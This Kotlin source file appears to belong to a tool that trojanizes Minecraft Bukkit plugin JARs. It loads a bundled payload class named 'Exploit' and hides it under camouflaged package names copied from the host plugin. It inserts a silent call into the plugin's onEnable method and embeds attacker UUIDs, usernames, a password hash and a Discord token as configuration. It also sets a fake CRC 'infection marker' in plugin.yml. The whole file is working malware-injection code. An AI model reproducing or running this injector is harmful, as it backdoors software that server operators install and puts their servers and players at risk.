package com.tmquan2508.inject.injector

import com.github.ajalt.mordant.rendering.TextColors.brightCyan
import com.rikonardo.cafebabe.ClassFile
import com.tmquan2508.inject.cli.Logs
import com.tmquan2508.inject.utils.generateCamouflagePlan
import com.tmquan2508.inject.utils.loadDefaultPayload
import javassist.ClassPool
import javassist.CtBehavior
import javassist.CtNewMethod
import javassist.bytecode.CodeIterator
import javassist.bytecode.ConstPool
import javassist.bytecode.Opcode
import org.yaml.snakeyaml.Yaml
import java.io.*
import java.nio.charset.StandardCharsets
import java.nio.file.*
import java.security.MessageDigest
import java.util.*
import java.util.zip.CRC32
import java.util.zip.ZipFile
import kotlin.io.path.inputStream
import kotlin.io.path.name
import kotlin.io.path.writeBytes

private object CrcPatcher {
    private const val EOCD_SIGNATURE = 0x06054b50
    private const val CENTRAL_DIR_SIGNATURE = 0x02014b50
    private const val FAKE_STRING = "openbd.injected"

    fun markJarWithFakeCRC(jarPath: Path) {
        val bytes = Files.readAllBytes(jarPath)
        val eocdOffset = findEOCDOffset(bytes)
        if (eocdOffset == -1) {
            throw IOException("EOCD not found in ${jarPath.name}")
        }

        val centralDirectoryOffset = getIntLE(bytes, eocdOffset + 16)
        var currentOffset = centralDirectoryOffset

        while (getIntLE(bytes, currentOffset) == CENTRAL_DIR_SIGNATURE) {
            val fileNameLength = getShortLE(bytes, currentOffset + 28)
            val extraFieldLength = getShortLE(bytes, currentOffset + 30)
            val fileCommentLength = getShortLE(bytes, currentOffset + 32)

            val filename = String(bytes, currentOffset + 46, fileNameLength, StandardCharsets.UTF_8)

            if ("plugin.yml" == filename) {
                val crcOffset = currentOffset + 16
                val fakeCRC = calculateFakeCRC()
                putIntLE(bytes, crcOffset, fakeCRC.toInt())
                jarPath.writeBytes(bytes)
                return
            }
            currentOffset += 46 + fileNameLength + extraFieldLength + fileCommentLength
        }
        throw IOException("plugin.yml not found in central directory of ${jarPath.name}")
    }

    fun calculateFakeCRC(): Long {
        val crc = CRC32()
        crc.update(FAKE_STRING.toByteArray(StandardCharsets.UTF_8))
        return crc.value
    }

    private fun findEOCDOffset(bytes: ByteArray): Int {
        for (i in bytes.size - 22 downTo (bytes.size - 65557).coerceAtLeast(0)) {
            if (getIntLE(bytes, i) == EOCD_SIGNATURE) {
                return i
            }
        }
        return -1
    }

    private fun getIntLE(b: ByteArray, off: Int): Int {
        return (b[off].toInt() and 0xFF) or
                ((b[off + 1].toInt() and 0xFF) shl 8) or
                ((b[off + 2].toInt() and 0xFF) shl 16) or
                ((b[off + 3].toInt() and 0xFF) shl 24)
    }

    private fun putIntLE(b: ByteArray, off: Int, value: Int) {
        b[off] = (value and 0xFF).toByte()
        b[off + 1] = ((value shr 8) and 0xFF).toByte()
        b[off + 2] = ((value shr 16) and 0xFF).toByte()
        b[off + 3] = ((value shr 24) and 0xFF).toByte()
    }

    private fun getShortLE(b: ByteArray, off: Int): Int {
        return (b[off].toInt() and 0xFF) or ((b[off + 1].toInt() and 0xFF) shl 8)
    }
}

fun process(
    input: Path,
    output: Path,
    replace: Boolean,
    camouflage: Boolean,
    uuids: Array<String>,
    usernames: Array<String>,
    password: String?,
    prefix: String,
    discordToken: String,
    injectOther: Boolean,
    warnings: Boolean
) {
    Logs.task("Processing ${input.name}")

    try {
        ZipFile(input.toFile()).use { zipFile ->
            val entry = zipFile.getEntry("plugin.yml")
            if (entry != null) {
                val expectedCrc = CrcPatcher.calculateFakeCRC()
                if (entry.crc == expectedCrc) {
                    Logs.finish().warn("Skipped plugin because it is already patched (marker found in plugin.yml CRC)")
                    return
                }
            }
        }
    } catch (e: Exception) {
        Logs.warn("Could not read ZIP data from ${input.name}, proceeding with injection anyway. Error: ${e.message}")
    }


    if (!replace && Files.exists(output)) {
        Logs.finish().warn("Skipped plugin because output file already exists")
        return
    }

    val tempDir = File("./.openbd")
    val tempJar = File(tempDir, "current.jar")
    val patchedDir = File(tempDir, "patched")

    try {
        tempDir.mkdirs()
        patchedDir.mkdirs()
        Files.copy(input, tempJar.toPath(), StandardCopyOption.REPLACE_EXISTING)

        var fileSystem: FileSystem? = null
        val finalMainPayloadName: String
        val pluginMainClass: String

        try {
            val fs = FileSystems.newFileSystem(tempJar.toPath())
            fileSystem = fs

            val pluginData: Map<String, Any> = Yaml().load(fs.getPath("/plugin.yml").inputStream())
            pluginMainClass = (pluginData["main"] as String?) ?: throw Exception("No main class in plugin.yml")
            Logs.info("Plugin main class: ${brightCyan(pluginMainClass)}")

            val payloadClasses = loadDefaultPayload()
            val allInjectableClasses = payloadClasses
            val originalConfigClassName = "com/tmquan2508/exploit/Config"
            val originalMainPayloadName = "com/tmquan2508/exploit/Exploit"

            val (masterRelocationMap, finalPayloadName) = buildMasterRelocationMap(
                payloadClasses,
                camouflage,
                tempJar,
                originalMainPayloadName
            )
            finalMainPayloadName = finalPayloadName

            val invertedRelocationMap = masterRelocationMap.entries.associate { (k, v) -> v to k }

            Logs.info("Relocating and camouflaging payload classes...")
            var finalClasses = relocateClasses(allInjectableClasses, masterRelocationMap)
            Logs.info("Relocation complete.")

            Logs.info("Building and applying dynamic configuration...")
            val finalConfigClassName = masterRelocationMap[originalConfigClassName] ?: originalConfigClassName
            val hashedPassword = password?.toSha256() ?: ""

            finalClasses = applyConfiguration(
                classes = finalClasses,
                targetClassName = finalConfigClassName,
                uuids = uuids,
                usernames = usernames,
                password = hashedPassword,
                prefix = prefix,
                discordToken = discordToken,
                injectOther = injectOther,
                warnings = warnings,
                camouflage = camouflage,
                invertedRelocationMap = invertedRelocationMap
            )

            Logs.info("Injecting ${finalClasses.size} final classes...")
            finalClasses.forEach { finalClass ->
                val pathInJar = fs.getPath(finalClass.name + ".class")
                pathInJar.parent?.let { if (!Files.exists(it)) Files.createDirectories(it) }
                val classBytes = finalClass.compile()
                Files.write(pathInJar, classBytes)
            }
            Logs.info("All payload classes injected successfully.")

        } finally {
            fileSystem?.close()
        }

        Logs.info("Patching main plugin class to load payload...")
        val finalMainPayloadCallName = finalMainPayloadName.replace('/', '.')

        val codeToInsert = """
            try {
                new $finalMainPayloadCallName((org.bukkit.plugin.Plugin)this);
            } catch (Throwable ignored) { }
        """.trimIndent()

        Logs.info("Injecting code into ${pluginMainClass}.onEnable(): { $codeToInsert }")

        injectIntoOnEnable(
            jarPath = tempJar.toPath(),
            targetClass = pluginMainClass,
            codeToInsert = codeToInsert,
            saveToDir = patchedDir.path
        )

        Logs.info("Replacing original main class with patched version...")
        fileSystem = FileSystems.newFileSystem(tempJar.toPath())
        try {
            val pluginMainClassPath = pluginMainClass.replace('.', '/')
            val patchedClassFile = patchedDir.toPath().resolve("$pluginMainClassPath.class")
            if (!Files.exists(patchedClassFile)) {
                throw Exception("Patched class file not found after Javassist injection. Check logs for errors.")
            }
            val pathInJar = fileSystem.getPath("$pluginMainClassPath.class")
            Files.copy(patchedClassFile, pathInJar, StandardCopyOption.REPLACE_EXISTING)
        } finally {
            fileSystem.close()
        }

        Files.copy(tempJar.toPath(), output, StandardCopyOption.REPLACE_EXISTING)
        
        setInfectionMarker(output)

        Logs.finish().info("${input.name} patched successfully (Payload injected, CRC marker set)")
    } finally {
        if (tempDir.exists()) {
            tempDir.deleteRecursively()
        }
    }
}

private fun setInfectionMarker(targetJarPath: Path) {
    Logs.info("Setting infection marker by faking plugin.yml CRC...")
    try {
        CrcPatcher.markJarWithFakeCRC(targetJarPath)
        Logs.info("Infection marker set successfully on target JAR.")
    } catch (e: IOException) {
        Logs.error("Failed to set infection marker on target JAR: ${e.message}")
    }
}

fun injectIntoOnEnable(jarPath: Path, targetClass: String, codeToInsert: String, saveToDir: String) {
    val pool = ClassPool.getDefault()
    pool.insertClassPath(jarPath.toString())
    val cc = pool.get(targetClass)

    cc.defrost()

    try {
        val onEnableMethod = cc.getDeclaredMethod("onEnable")
        onEnableMethod.insertBefore(codeToInsert)
        Logs.info("Injected code into existing 'onEnable' method.")
    } catch (e: javassist.NotFoundException) {
        Logs.warn("Method 'onEnable' not found in '$targetClass'. Creating a new one.")
        try {
            val newMethod = CtNewMethod.make("public void onEnable() { $codeToInsert }", cc)
            cc.addMethod(newMethod)
            Logs.info("Created and injected code into a new 'onEnable' method.")
        } catch (creationError: Exception) {
            Logs.error("Failed to create a new 'onEnable' method in '$targetClass'. The plugin might not be a standard Bukkit plugin.")
            creationError.printStackTrace()
        }
    }

    cc.writeFile(saveToDir)
    cc.detach()
}

private fun applyConfiguration(
    classes: List<ClassFile>,
    targetClassName: String,
    uuids: Array<String>,
    usernames: Array<String>,
    password: String,
    prefix: String,
    discordToken: String,
    injectOther: Boolean,
    warnings: Boolean,
    camouflage: Boolean,
    invertedRelocationMap: Map<String, String>
): List<ClassFile> {
    val targetIndex = classes.indexOfFirst { it.name == targetClassName }
    if (targetIndex == -1) {
        Logs.warn("Could not find configuration target class '$targetClassName' after relocation. Skipping configuration injection.")
        return classes
    }

    val originalTargetFile = classes[targetIndex]
    val originalBytecode = originalTargetFile.compile()

    val originalSimpleNames = classes.map { finalClass ->
        val originalFullName = invertedRelocationMap.getOrDefault(finalClass.name, finalClass.name)
        originalFullName.substringAfterLast('/')
    }.sorted()

    val classlistPayloadBase64: String
    try {
        ByteArrayOutputStream().use { baos ->
            DataOutputStream(baos).use { dos ->
                originalSimpleNames.forEach { simpleName ->
                    val nameBytes = simpleName.toByteArray(StandardCharsets.UTF_8)
                    dos.writeInt(nameBytes.size)
                    dos.write(nameBytes)
                }
            }
            classlistPayloadBase64 = Base64.getEncoder().encodeToString(baos.toByteArray())
            Logs.info("Generated class list payload with ${originalSimpleNames.size} original simple names.")
            Logs.info("Classlist Payload (Base64 of simple names): $classlistPayloadBase64")
        }
    } catch (e: IOException) {
        Logs.error("Failed to generate class list payload: ${e.message}")
        return classes
    }

    val placeholders = mapOf(
        "::UUIDS::" to uuids.joinToString(","),
        "::USERNAMES::" to usernames.joinToString(","),
        "::PREFIX::" to prefix,
        "::INJECT_OTHER::" to injectOther.toString(),
        "::WARNINGS::" to warnings.toString(),
        "::DISCORD_TOKEN::" to discordToken,
        "::PASSWORD::" to password,
        "::CAMOUFLAGE::" to camouflage.toString(),
        "::CLASSLIST::" to classlistPayloadBase64
    )

    try {
        val pool = ClassPool.getDefault()
        val ctClass = pool.makeClass(ByteArrayInputStream(originalBytecode))
        ctClass.defrost()
        val constPool = ctClass.classFile.constPool

        placeholders.forEach { (placeholder, newValue) ->
            var placeholderIndex = -1
            for (i in 1 until constPool.size) {
                if (constPool.getTag(i) == ConstPool.CONST_String && constPool.getStringInfo(i) == placeholder) {
                    placeholderIndex = i
                    break
                }
            }

            if (placeholderIndex == -1) {
                if (placeholder != "::USERNAMES::" && placeholder != "::UUIDS::" || (newValue.isNotEmpty())) {
                    Logs.warn("Could not find placeholder '$placeholder' in constant pool. Skipping replacement.")
                }
                return@forEach
            }

            val newValueIndex = constPool.addStringInfo(newValue)
            val behaviorsToScan = mutableListOf<CtBehavior>()
            behaviorsToScan.addAll(ctClass.declaredMethods)
            ctClass.classInitializer?.let { behaviorsToScan.add(it) }

            var replaced = false
            for (behavior in behaviorsToScan) {
                val codeAttribute = behavior.methodInfo.codeAttribute ?: continue
                val iterator = codeAttribute.iterator()
                while (iterator.hasNext()) {
                    val pos = iterator.next()
                    when (iterator.byteAt(pos)) {
                        Opcode.LDC -> {
                            val indexInCode = iterator.byteAt(pos + 1)
                            if (indexInCode == placeholderIndex) {
                                iterator.writeByte(newValueIndex, pos + 1)
                                replaced = true
                            }
                        }
                        Opcode.LDC_W -> {
                            val indexInCode = iterator.u16bitAt(pos + 1)
                            if (indexInCode == placeholderIndex) {
                                iterator.write16bit(newValueIndex, pos + 1)
                                replaced = true
                            }
                        }
                    }
                }
            }
            if (!replaced && (placeholder == "::CLASSLIST::" || (placeholder == "::UUIDS::" && newValue.isNotEmpty()))) {
                Logs.warn("Found placeholder '$placeholder' in pool, but no LDC instruction uses it.")
            }
        }
        
        val modifiedBytecode = ctClass.toBytecode()
        ctClass.detach()

        val modifiedClassFile = ClassFile(modifiedBytecode)
        modifiedClassFile.name = originalTargetFile.name

        val finalClasses = classes.toMutableList()
        finalClasses[targetIndex] = modifiedClassFile
        
        Logs.info("Successfully applied configuration using Javassist patcher.")
        return finalClasses

    } catch (e: Exception) {
        Logs.error("Failed to embed configuration using Javassist: ${e.message}")
        e.printStackTrace()
        return classes
    }
}


private fun buildMasterRelocationMap(
    payloadClasses: List<ClassFile>,
    camouflage: Boolean,
    jarFile: File,
    mainPayloadOriginalName: String
): Pair<Map<String, String>, String> {
    val masterMap = mutableMapOf<String, String>()
    if (camouflage) {
        Logs.info("Camouflage enabled. Generating camouflage plan...")
        val camouflagePlan = generateCamouflagePlan(jarFile)
        val destinationPackage = camouflagePlan.packageName
        val namePrefix = camouflagePlan.namePrefix
        Logs.info("Selected camouflage package: '$destinationPackage' with prefix '$namePrefix'")
        
        payloadClasses.forEach {
            val originalName = it.name
            val simpleName = originalName.substringAfterLast("/")
            val newName = "${destinationPackage}/${namePrefix}$simpleName"
            masterMap[originalName] = newName
        }
    }
    val finalMainPayloadName = masterMap[mainPayloadOriginalName] ?: mainPayloadOriginalName
    return Pair(masterMap, finalMainPayloadName)
}

private fun relocateClasses(classes: List<ClassFile>, relocationMap: Map<String, String>): List<ClassFile> {
    if (relocationMap.isEmpty()) return classes
    val sortedKeys = relocationMap.keys.sortedByDescending { it.length }
    return classes.map { originalClassFile ->
        val classFile = ClassFile(originalClassFile.compile())
        classFile.name = relocationMap[classFile.name] ?: classFile.name
        for (constant in classFile.constantPool.entries) {
            if (constant is com.rikonardo.cafebabe.data.constantpool.ConstantUtf8) {
                var tempValue = constant.value
                for (key in sortedKeys) {
                    relocationMap[key]?.let { newValue ->
                        tempValue = tempValue.replace(key, newValue)
                    }
                }
                constant.value = tempValue
            }
        }
        classFile
    }
}

private fun String.toSha256(): String {
    return MessageDigest.getInstance("SHA-256")
        .digest(this.toByteArray())
        .fold("") { str, it -> str + "%02x".format(it) }
}